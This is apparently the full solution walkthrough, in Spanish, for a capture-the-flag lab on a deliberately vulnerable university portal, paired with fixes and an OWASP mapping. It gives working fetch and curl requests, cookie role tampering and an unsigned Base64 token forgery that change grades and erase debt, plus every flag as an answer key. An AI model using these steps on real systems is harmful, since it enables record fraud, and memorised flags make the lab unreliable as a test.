# Solución Completa - DarkWall Lab UniLeak

**SPOILER:** Este archivo contiene la solución completa del laboratorio. Solo consúltalo si estás realmente atascado o quieres verificar tu solución.

---

## ACTO 1: Login y Reconocimiento

### Objetivo
Acceder al sistema y reconocer el entorno.

### Solución
1. Ir a `http://localhost:5000`
2. Credenciales:
   - Usuario: `20261001`
   - Clave: `12051998`
3. Hacer clic en "Ingresar"

### ¿Qué aprendemos?
Las credenciales están en texto plano en la base de datos CSV (`data/usuarios.csv`).

---

## ACTO 2: Esteganografía en la Imagen

### Objetivo
Descubrir información oculta en la imagen del carnet universitario.

### Vulnerabilidad
La imagen `profile_card.png` contiene un mensaje oculto usando esteganografía LSB.

### Solución

#### Método 1: Usando el script incluido
```bash
python decode_stego.py
```

#### Método 2: Usando CyberChef
1. Descargar la imagen: `static/uploads/profile_card.png`
2. Ir a: https://gchq.github.io/CyberChef/
3. Usar la receta: "Extract LSB" en el canal Red
4. Buscar el texto oculto

#### Método 3: Usando AperiSolve
1. Ir a: https://www.aperisolve.com/
2. Subir la imagen
3. Revisar los resultados de LSB

### Mensaje Oculto
```
/internal/student-status?debug=true | FLAG{images_should_not_talk}
```

### FLAG #1
```
FLAG{images_should_not_talk}
```

---

## ACTO 3: Endpoint de Debug

### Objetivo
Acceder al endpoint interno descubierto en la esteganografía.

### Vulnerabilidad
Endpoint de debug expuesto sin autenticación.

### Solución
1. Abrir: `http://localhost:5000/internal/student-status?debug=true`
2. Observar la respuesta JSON con información sensible

### Respuesta
```json
{
  "student_id": "20261001",
  "status": "active",
  "grade_endpoint": "/api/grades/update",
  "financial_endpoint": "/api/finance/update",
  "monitor_panel": "/monitor/revisions",
  "academic_panel": "/academic/management",
  "note": "frontend validates role access",
  "flag": "FLAG{debug_mode_ruins_everything}"
}
```

### FLAG #2
```
FLAG{debug_mode_ruins_everything}
```

### ¿Qué aprendemos?
- Endpoints de debug nunca deben estar en producción
- Information Disclosure: revelan estructura interna del sistema
- Documentan otros endpoints vulnerables

---

## ACTO 4: Modificación de Notas

### Objetivo
Modificar una nota académica sin tener permisos.

### Vulnerabilidad
- Validación solo del lado del cliente
- Endpoint sin control de autorización
- IDOR (Insecure Direct Object Reference)

### Solución

#### Método 1: Habilitar botón deshabilitado
1. En el panel de estudiante, abrir DevTools (F12)
2. Ir a la pestaña "Console"
3. Ejecutar:
```javascript
document.querySelector('.btn-revision').disabled = false;
```
4. Hacer clic en el botón ahora habilitado

#### Método 2: Llamada directa con Fetch
1. Abrir DevTools (F12) → Console
2. Ejecutar:
```javascript
fetch('/api/grades/update', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        student_id: '20261001',
        subject: 'Criptografía',
        grade: 5.0
    })
})
.then(res => res.json())
.then(data => console.log(data));
```

#### Método 3: Con cURL
```bash
curl -X POST http://localhost:5000/api/grades/update \
  -H "Content-Type: application/json" \
  -d '{"student_id":"20261001","subject":"Criptografía","grade":5.0}'
```

### FLAG #3
```
FLAG{client_side_validation_is_fake}
```

### ¿Qué aprendemos?
- Las validaciones del cliente son fáciles de bypassear
- Siempre validar en el servidor
- Los botones deshabilitados no son seguridad

---

## ACTO 5: Escalada de Privilegios - Monitor

### Objetivo
Acceder al panel de monitor sin ser monitor.

### Vulnerabilidad
- Cookie de sesión en texto plano (JSON sin firma)
- Control de acceso basado solo en el valor de la cookie

### Solución

1. Abrir DevTools (F12) → Application/Storage → Cookies
2. Buscar la cookie `session_data`
3. Ver su valor actual:
```json
{"user_id":"20261001","nombre":"Carlos Mendoza","role":"student"}
```

4. Modificar el campo `role`:
```json
{"user_id":"20261001","nombre":"Carlos Mendoza","role":"monitor"}
```

5. Guardar la cookie modificada
6. Ir a: `http://localhost:5000/monitor/revisions`
7. Acceso otorgado.

La **FLAG #4** está en la propia página como texto invisible (mismo color que el fondo). Para obtenerla: seleccionar toda la página con Ctrl+A o arrastrar el cursor sobre el contenido; el texto de la flag quedará visible al quedar seleccionado. También puede verse inspeccionando el HTML en DevTools.

### FLAG #4
```
FLAG{academic_roles_are_just_strings}
```

### ¿Qué aprendemos?
- Las cookies deben estar firmadas (usar session de Flask)
- Los roles deben validarse en el servidor
- JSON != Seguridad

---

## ACTO 6: Token Base64 Editable

### Objetivo
Obtener acceso completo de coordinador modificando un token Base64.

### Vulnerabilidad
- Token en Base64 (encoding, no encryption)
- Sin firma criptográfica
- Validación solo del contenido decodificado

### Solución

1. En el panel de monitor, hacer clic en "Solicitar Acceso Completo"
2. Ver el mensaje: "Se requiere token de coordinador sin restricciones"
3. Abrir DevTools (F12) → Console
4. Ver el hint en la consola sobre el token actual

5. Crear el token correcto:
```javascript
// Token con privilegios completos
const token = btoa(JSON.stringify({
    role: 'coordinator',
    limited: false
}));

// Guardarlo como cookie
document.cookie = 'access_token=' + token;

// Redirigir al panel académico
window.location.href = '/academic/management';
```

6. También se puede verificar primero:
```javascript
fetch('/api/verify-token', {
    method: 'POST',
    headers: {
        'Authorization': 'Bearer ' + token
    }
})
.then(res => res.json())
.then(data => console.log(data));
```

### FLAG #5
```
FLAG{base64_is_a_lie}
```

### ¿Qué aprendemos?
- Base64 es encoding, no encryption
- Los tokens deben estar firmados (JWT con secret)
- Nunca confiar en datos del cliente

---

## ACTO 7: Modificación de Estado Académico

### Objetivo
Aprobar una materia pendiente desde el panel de coordinación.

### Vulnerabilidad
- Acceso administrativo sin doble verificación
- Sin logging de cambios críticos
- Sin confirmación adicional

### Solución

1. Con acceso al panel académico (del paso anterior)
2. Buscar la materia "Criptografía" con estado "Pendiente"
3. Hacer clic en "Aprobar Materia"
4. Confirmar en el diálogo
5. La materia cambia a "Aprobado"

Alternativamente, llamada directa:
```javascript
fetch('/api/academic/update', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        student_id: '20261001',
        subject: 'Criptografía',
        status: 'Aprobado'
    })
})
.then(res => res.json())
.then(data => console.log(data));
```

### FLAG #6
```
FLAG{grades_are_not_sacred}
```

---

## ACTO FINAL: Eliminación de Deudas

### Objetivo
Eliminar completamente la deuda universitaria.

### Vulnerabilidad
- Endpoint financiero sin controles
- Sin auditoría de cambios financieros
- Sin límites ni validaciones

### Solución

#### Método 1: Desde el panel académico
1. En el panel académico, buscar tu deuda ($4,200,000)
2. Hacer clic en "Ajustar Deuda"
3. Ingresar: `0`
4. La deuda desaparece

#### Método 2: Llamada directa
```javascript
fetch('/api/finance/update', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        student_id: '20261001',
        debt: 0
    })
})
.then(res => res.json())
.then(data => {
    console.log(data);
    alert('Deuda eliminada: ' + data.message);
});
```

#### Método 3: Con cURL
```bash
curl -X POST http://localhost:5000/api/finance/update \
  -H "Content-Type: application/json" \
  -d '{"student_id":"20261001","debt":0}'
```

### FLAG FINAL
```
FLAG{this_is_why_universities_get_hacked}
```

### ¿Qué aprendemos?
- Operaciones financieras deben tener múltiples validaciones
- Logging y auditoría son críticos
- Principio de mínimo privilegio

---

## Resumen de Vulnerabilidades

| # | Vulnerabilidad | Tipo OWASP | Impacto |
|---|----------------|------------|---------|
| 1 | Esteganografía con datos sensibles | Information Disclosure | Medio |
| 2 | Endpoint de debug expuesto | Security Misconfiguration | Alto |
| 3 | Sin validación backend | Broken Access Control | Crítico |
| 4 | Validación solo en cliente | Client-Side Enforcement | Alto |
| 5 | Cookie sin firma | Cryptographic Failure | Crítico |
| 6 | Token Base64 sin firma | Insecure Design | Crítico |
| 7 | Sin control de autorización | Broken Access Control | Crítico |
| 8 | Modificación financiera sin auditoría | Missing Function Level Access | Crítico |

---

## Cómo Prevenir Cada Vulnerabilidad

### 1. Esteganografía
- No ocultar información sensible en imágenes
- Si se usa para marcas de agua, usar solo para identificación
- No confiar en "security through obscurity"

### 2. Endpoints de Debug
```python
# MAL
@app.route('/internal/debug')
def debug():
    return jsonify(sensitive_data)

# BIEN
@app.route('/internal/debug')
@requires_admin
def debug():
    if not app.debug:
        abort(404)
    return jsonify(sanitized_data)
```

### 3. Validación Backend
```python
# MAL
@app.route('/api/grades/update', methods=['POST'])
def update_grades():
    data = request.get_json()
    update_db(data)  # Sin validación

# BIEN
@app.route('/api/grades/update', methods=['POST'])
@requires_auth
@requires_role('coordinator')
def update_grades():
    data = request.get_json()
    if not validate_grade_update(data, current_user):
        abort(403)
    update_db(data)
    log_audit('grade_update', data, current_user)
```

### 4. Cookies Seguras
```python
# MAL
session_data = json.dumps(user_info)
resp.set_cookie('session_data', session_data)

# BIEN
from flask import session
session['user_id'] = user.id
session['role'] = user.role
# Flask firma automáticamente las sesiones
```

### 5. Tokens Seguros
```python
# MAL
token = base64.b64encode(json.dumps(data))

# BIEN
import jwt
token = jwt.encode(
    {'user_id': user.id, 'role': user.role},
    app.config['SECRET_KEY'],
    algorithm='HS256'
)
```

### 6. Control de Acceso
```python
from functools import wraps

def requires_role(required_role):
    def decorator(f):
        @wraps(f)
        def decorated_function(*args, **kwargs):
            if not current_user.has_role(required_role):
                abort(403)
            return f(*args, **kwargs)
        return decorated_function
    return decorator
```

### 7. Auditoría
```python
def log_audit(action, data, user):
    AuditLog.create(
        timestamp=datetime.now(),
        user_id=user.id,
        action=action,
        data=json.dumps(data),
        ip=request.remote_addr
    )
```

---

## Todas las FLAGS

```
FLAG{images_should_not_talk}
FLAG{debug_mode_ruins_everything}
FLAG{client_side_validation_is_fake}
FLAG{academic_roles_are_just_strings}
FLAG{base64_is_a_lie}
FLAG{grades_are_not_sacred}
FLAG{this_is_why_universities_get_hacked}
```

**Total: 7 FLAGS**

---

## Reflexión Final

Este laboratorio demuestra cómo vulnerabilidades "pequeñas" se encadenan:

1. **Información filtrada** (imagen) → lleva a
2. **Endpoint de debug** → revela
3. **APIs sin protección** → permite
4. **Modificación de datos** → escala a
5. **Cambio de rol** → da acceso a
6. **Panel administrativo** → permite
7. **Modificación de datos financieros**

**Cada vulnerabilidad por sí sola podría parecer menor, pero juntas comprometen todo el sistema.**

---

## Recursos Adicionales

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

---

**¿Completaste el lab? ¡Felicitaciones!**

Ahora comprendes cómo pequeños errores de diseño pueden llevar a compromisos completos del sistema.

**Usa este conocimiento de manera responsable.**
